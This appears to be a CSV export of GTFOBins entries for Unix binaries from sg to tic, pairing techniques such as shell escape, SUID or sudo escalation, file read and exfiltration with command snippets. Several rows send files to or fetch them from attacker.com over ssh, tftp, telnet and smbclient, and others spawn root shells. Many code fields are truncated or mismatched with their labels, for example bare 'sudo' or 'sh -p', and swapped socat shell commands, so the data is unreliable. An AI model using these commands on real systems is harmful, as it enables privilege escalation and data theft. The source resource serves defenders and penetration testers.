sg,Shell,https://gtfobins.github.io/gtfobins/sg/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,sg $(id -ng)
sg,Sudo,https://gtfobins.github.io/gtfobins/sg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
shuf,File write,https://gtfobins.github.io/gtfobins/shuf/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
shuf -e DATA -o ""$LFILE"""
shuf,File read,https://gtfobins.github.io/gtfobins/shuf/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
shuf -z ""$LFILE"""
shuf,SUID,https://gtfobins.github.io/gtfobins/shuf/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
shuf,Sudo,https://gtfobins.github.io/gtfobins/shuf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
slsh,Shell,https://gtfobins.github.io/gtfobins/slsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"slsh -e 'system(""/bin/sh"")'"
slsh,Sudo,https://gtfobins.github.io/gtfobins/slsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
slsh,Limited SUID,https://gtfobins.github.io/gtfobins/slsh/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
smbclient,Shell,https://gtfobins.github.io/gtfobins/smbclient/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"smbclient '\\attacker\share'
!/bin/sh"
smbclient,File upload,https://gtfobins.github.io/gtfobins/smbclient/#file-upload,It can exfiltrate files on the network.,sudo smbserver.py share /tmp
smbclient,File download,https://gtfobins.github.io/gtfobins/smbclient/#file-download,It can download remote files.,sudo smbserver.py share /tmp
smbclient,Sudo,https://gtfobins.github.io/gtfobins/smbclient/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
snap,Sudo,https://gtfobins.github.io/gtfobins/snap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
socat,Shell,https://gtfobins.github.io/gtfobins/socat/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,socat stdin exec:/bin/sh
socat,Reverse shell,https://gtfobins.github.io/gtfobins/socat/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
socat,Bind shell,https://gtfobins.github.io/gtfobins/socat/#bind-shell,It can bind a shell to a local port to allow remote network access.,"socat FILE:`tty`,raw,echo=0 TCP:target.com:12345"
socat,File upload,https://gtfobins.github.io/gtfobins/socat/#file-upload,It can exfiltrate files on the network.,"socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat"
socat,File download,https://gtfobins.github.io/gtfobins/socat/#file-download,It can download remote files.,"socat -u file:file_to_send tcp-listen:12345,reuseaddr"
socat,File write,https://gtfobins.github.io/gtfobins/socat/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
socat -u 'exec:echo DATA' ""open:$LFILE,creat"""
socat,File read,https://gtfobins.github.io/gtfobins/socat/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
socat -u ""file:$LFILE"" -"
socat,Sudo,https://gtfobins.github.io/gtfobins/socat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
socat,Limited SUID,https://gtfobins.github.io/gtfobins/socat/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
socket,Reverse shell,https://gtfobins.github.io/gtfobins/socket/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
socket,Bind shell,https://gtfobins.github.io/gtfobins/socket/#bind-shell,It can bind a shell to a local port to allow remote network access.,nc target.com 12345
soelim,File read,https://gtfobins.github.io/gtfobins/soelim/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
soelim ""$LFILE"""
soelim,SUID,https://gtfobins.github.io/gtfobins/soelim/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
soelim,Sudo,https://gtfobins.github.io/gtfobins/soelim/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
softlimit,Shell,https://gtfobins.github.io/gtfobins/softlimit/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,softlimit /bin/sh
softlimit,SUID,https://gtfobins.github.io/gtfobins/softlimit/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
softlimit,Sudo,https://gtfobins.github.io/gtfobins/softlimit/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sort,File read,https://gtfobins.github.io/gtfobins/sort/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
sort -m ""$LFILE"""
sort,SUID,https://gtfobins.github.io/gtfobins/sort/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sort,Sudo,https://gtfobins.github.io/gtfobins/sort/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
split,Shell,https://gtfobins.github.io/gtfobins/split/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,split --filter=/bin/sh /dev/stdin
split,Command,https://gtfobins.github.io/gtfobins/split/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
TF=$(mktemp)
split --filter=$COMMAND $TF"
split,File write,https://gtfobins.github.io/gtfobins/split/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",xaa
split,File read,https://gtfobins.github.io/gtfobins/split/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
TF=$(mktemp)
split $LFILE $TF
cat $TF*"
split,Sudo,https://gtfobins.github.io/gtfobins/split/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sqlite3,Shell,https://gtfobins.github.io/gtfobins/sqlite3/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,sqlite3 /dev/null '.shell /bin/sh'
sqlite3,File write,https://gtfobins.github.io/gtfobins/sqlite3/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'"
sqlite3,File read,https://gtfobins.github.io/gtfobins/sqlite3/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF"
sqlite3,SUID,https://gtfobins.github.io/gtfobins/sqlite3/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sqlite3,Sudo,https://gtfobins.github.io/gtfobins/sqlite3/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sqlite3,Limited SUID,https://gtfobins.github.io/gtfobins/sqlite3/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
sqlmap,Shell,https://gtfobins.github.io/gtfobins/sqlmap/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')"""
sqlmap,Sudo,https://gtfobins.github.io/gtfobins/sqlmap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ss,File read,https://gtfobins.github.io/gtfobins/ss/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ss -a -F $LFILE"
ss,SUID,https://gtfobins.github.io/gtfobins/ss/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ss,Sudo,https://gtfobins.github.io/gtfobins/ss/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh-agent,Shell,https://gtfobins.github.io/gtfobins/ssh-agent/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ssh-agent /bin/sh
ssh-agent,SUID,https://gtfobins.github.io/gtfobins/ssh-agent/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ssh-agent,Sudo,https://gtfobins.github.io/gtfobins/ssh-agent/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh-keygen,Library load,https://gtfobins.github.io/gtfobins/ssh-keygen/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,ssh-keygen -D ./lib.so
ssh-keygen,SUID,https://gtfobins.github.io/gtfobins/ssh-keygen/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ssh-keygen,Sudo,https://gtfobins.github.io/gtfobins/ssh-keygen/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh-keyscan,File read,https://gtfobins.github.io/gtfobins/ssh-keyscan/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ssh-keyscan -f $LFILE"
ssh-keyscan,SUID,https://gtfobins.github.io/gtfobins/ssh-keyscan/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ssh-keyscan,Sudo,https://gtfobins.github.io/gtfobins/ssh-keyscan/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh,Shell,https://gtfobins.github.io/gtfobins/ssh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ssh localhost $SHELL --noprofile --norc
ssh,File upload,https://gtfobins.github.io/gtfobins/ssh/#file-upload,It can exfiltrate files on the network.,"HOST=user@attacker.com
RPATH=file_to_save
LPATH=file_to_send
ssh $HOST ""cat > $RPATH"" < $LPATH"
ssh,File download,https://gtfobins.github.io/gtfobins/ssh/#file-download,It can download remote files.,"HOST=user@attacker.com
RPATH=file_to_get
LPATH=file_to_save
ssh $HOST ""cat $RPATH"" > $LPATH"
ssh,File read,https://gtfobins.github.io/gtfobins/ssh/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ssh -F $LFILE localhost"
ssh,Sudo,https://gtfobins.github.io/gtfobins/ssh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sshpass,Shell,https://gtfobins.github.io/gtfobins/sshpass/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,sshpass /bin/sh
sshpass,SUID,https://gtfobins.github.io/gtfobins/sshpass/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sshpass,Sudo,https://gtfobins.github.io/gtfobins/sshpass/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
start-stop-daemon,Shell,https://gtfobins.github.io/gtfobins/start-stop-daemon/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,start-stop-daemon -n $RANDOM -S -x /bin/sh
start-stop-daemon,SUID,https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
start-stop-daemon,Sudo,https://gtfobins.github.io/gtfobins/start-stop-daemon/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
stdbuf,Shell,https://gtfobins.github.io/gtfobins/stdbuf/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,stdbuf -i0 /bin/sh
stdbuf,SUID,https://gtfobins.github.io/gtfobins/stdbuf/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
stdbuf,Sudo,https://gtfobins.github.io/gtfobins/stdbuf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
strace,Shell,https://gtfobins.github.io/gtfobins/strace/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,strace -o /dev/null /bin/sh
strace,File write,https://gtfobins.github.io/gtfobins/strace/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",strace - DATA
strace,SUID,https://gtfobins.github.io/gtfobins/strace/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
strace,Sudo,https://gtfobins.github.io/gtfobins/strace/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
strings,File read,https://gtfobins.github.io/gtfobins/strings/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
strings ""$LFILE"""
strings,SUID,https://gtfobins.github.io/gtfobins/strings/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
strings,Sudo,https://gtfobins.github.io/gtfobins/strings/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
su,Sudo,https://gtfobins.github.io/gtfobins/su/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sudo,Sudo,https://gtfobins.github.io/gtfobins/sudo/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sysctl,Command,https://gtfobins.github.io/gtfobins/sysctl/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='/bin/sh -c id>/tmp/id'
sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id"
sysctl,File read,https://gtfobins.github.io/gtfobins/sysctl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",-p
sysctl,SUID,https://gtfobins.github.io/gtfobins/sysctl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sysctl,Sudo,https://gtfobins.github.io/gtfobins/sysctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
systemctl,SUID,https://gtfobins.github.io/gtfobins/systemctl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
systemctl,Sudo,https://gtfobins.github.io/gtfobins/systemctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
systemd-resolve,Sudo,https://gtfobins.github.io/gtfobins/systemd-resolve/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tac,File read,https://gtfobins.github.io/gtfobins/tac/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tac -s 'RANDOM' ""$LFILE"""
tac,SUID,https://gtfobins.github.io/gtfobins/tac/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tac,Sudo,https://gtfobins.github.io/gtfobins/tac/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tail,File read,https://gtfobins.github.io/gtfobins/tail/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tail -c1G ""$LFILE"""
tail,SUID,https://gtfobins.github.io/gtfobins/tail/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tail,Sudo,https://gtfobins.github.io/gtfobins/tail/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tar,Shell,https://gtfobins.github.io/gtfobins/tar/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar,File upload,https://gtfobins.github.io/gtfobins/tar/#file-upload,It can exfiltrate files on the network.,rmt
tar,File download,https://gtfobins.github.io/gtfobins/tar/#file-download,It can download remote files.,rmt
tar,File write,https://gtfobins.github.io/gtfobins/tar/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
TF=$(mktemp)
echo DATA > ""$TF""
tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P"
tar,File read,https://gtfobins.github.io/gtfobins/tar/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'"
tar,Sudo,https://gtfobins.github.io/gtfobins/tar/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tar,Limited SUID,https://gtfobins.github.io/gtfobins/tar/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
task,Shell,https://gtfobins.github.io/gtfobins/task/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,task execute /bin/sh
task,Sudo,https://gtfobins.github.io/gtfobins/task/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
taskset,Shell,https://gtfobins.github.io/gtfobins/taskset/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,taskset 1 /bin/sh
taskset,SUID,https://gtfobins.github.io/gtfobins/taskset/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
taskset,Sudo,https://gtfobins.github.io/gtfobins/taskset/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tasksh,Shell,https://gtfobins.github.io/gtfobins/tasksh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"tasksh
!/bin/sh"
tasksh,Sudo,https://gtfobins.github.io/gtfobins/tasksh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tasksh,Limited SUID,https://gtfobins.github.io/gtfobins/tasksh/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tbl,File read,https://gtfobins.github.io/gtfobins/tbl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tbl $LFILE"
tbl,SUID,https://gtfobins.github.io/gtfobins/tbl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tbl,Sudo,https://gtfobins.github.io/gtfobins/tbl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tclsh,Shell,https://gtfobins.github.io/gtfobins/tclsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr"
tclsh,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/tclsh/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
tclsh,SUID,https://gtfobins.github.io/gtfobins/tclsh/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tclsh,Sudo,https://gtfobins.github.io/gtfobins/tclsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tcpdump,Command,https://gtfobins.github.io/gtfobins/tcpdump/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='id'
TF=$(mktemp)
echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF"
tcpdump,Sudo,https://gtfobins.github.io/gtfobins/tcpdump/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tdbtool,Shell,https://gtfobins.github.io/gtfobins/tdbtool/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"tdbtool
! /bin/sh"
tdbtool,Sudo,https://gtfobins.github.io/gtfobins/tdbtool/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tdbtool,Limited SUID,https://gtfobins.github.io/gtfobins/tdbtool/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tee,File write,https://gtfobins.github.io/gtfobins/tee/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo DATA | ./tee -a ""$LFILE"""
tee,SUID,https://gtfobins.github.io/gtfobins/tee/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tee,Sudo,https://gtfobins.github.io/gtfobins/tee/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
telnet,Shell,https://gtfobins.github.io/gtfobins/telnet/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"RHOST=attacker.com
RPORT=12345
telnet $RHOST $RPORT
^]
!/bin/sh"
telnet,Reverse shell,https://gtfobins.github.io/gtfobins/telnet/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
telnet,Sudo,https://gtfobins.github.io/gtfobins/telnet/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
telnet,Limited SUID,https://gtfobins.github.io/gtfobins/telnet/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
terraform,File read,https://gtfobins.github.io/gtfobins/terraform/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","terraform console
file(""file_to_read"")"
terraform,SUID,https://gtfobins.github.io/gtfobins/terraform/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
terraform,Sudo,https://gtfobins.github.io/gtfobins/terraform/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tex,Shell,https://gtfobins.github.io/gtfobins/tex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tex --shell-escape '\write18{/bin/sh}\end'
tex,Sudo,https://gtfobins.github.io/gtfobins/tex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tex,Limited SUID,https://gtfobins.github.io/gtfobins/tex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tftp,File upload,https://gtfobins.github.io/gtfobins/tftp/#file-upload,It can exfiltrate files on the network.,"RHOST=attacker.com
tftp $RHOST
put file_to_send"
tftp,File download,https://gtfobins.github.io/gtfobins/tftp/#file-download,It can download remote files.,"RHOST=attacker.com
tftp $RHOST
get file_to_get"
tftp,SUID,https://gtfobins.github.io/gtfobins/tftp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tftp,Sudo,https://gtfobins.github.io/gtfobins/tftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tic,File read,https://gtfobins.github.io/gtfobins/tic/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tic -C ""$LFILE"""
tic,SUID,https://gtfobins.github.io/gtfobins/tic/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tic,Sudo,https://gtfobins.github.io/gtfobins/tic/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
